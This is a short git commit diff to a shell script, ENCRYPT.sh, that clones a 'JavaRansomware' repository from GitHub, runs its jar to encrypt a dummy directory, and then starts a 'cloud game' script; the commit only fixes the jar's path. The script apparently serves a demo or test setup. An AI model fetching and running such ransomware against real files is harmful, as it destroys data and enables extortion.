a3add0a3d3c32db66d662765da928bf16c86189c
christoper burgess <christopher.burgess@vortexa.com>
2018-05-03 16:15:27 +0100

    filepaths

--- ENCRYPT.sh
+++ ENCRYPT.sh
@@ -4,7 +4,7 @@ FILE_PATH_TO_ENCRYPT=./dummy_directory/
 
 git clone git@github.com:PanagiotisDrakatos/JavaRansomware.git
 
-java -jar JavaRansomware.jar $FILE_PATH_TO_ENCRYPT Encrypt
+java -jar ./JavaRansomware/JavaRansomware-2.1-jar-with-dependencies.jar $FILE_PATH_TO_ENCRYPT Encrypt
 
 ./start_cloud_game.sh
 
